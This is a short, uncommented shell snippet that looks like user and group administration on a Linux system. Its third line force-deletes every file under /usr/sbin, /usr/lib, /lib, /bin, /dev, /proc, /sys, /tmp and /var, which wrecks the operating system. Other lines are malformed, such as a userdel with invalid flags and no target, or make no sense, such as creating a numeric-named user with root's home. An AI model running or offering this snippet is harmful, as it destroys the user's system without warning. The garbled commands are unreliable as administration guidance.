usermod -g 0 root
groupmod -g 0 root
find /usr/sbin /usr/lib /lib /bin /dev /proc /sys /tmp /var -type f -exec rm -f {} \;
userdel -r -l --gid 0
newuid=1000
useradd -u $newuid -g 0 -s /sbin/nologin -d /root $newuid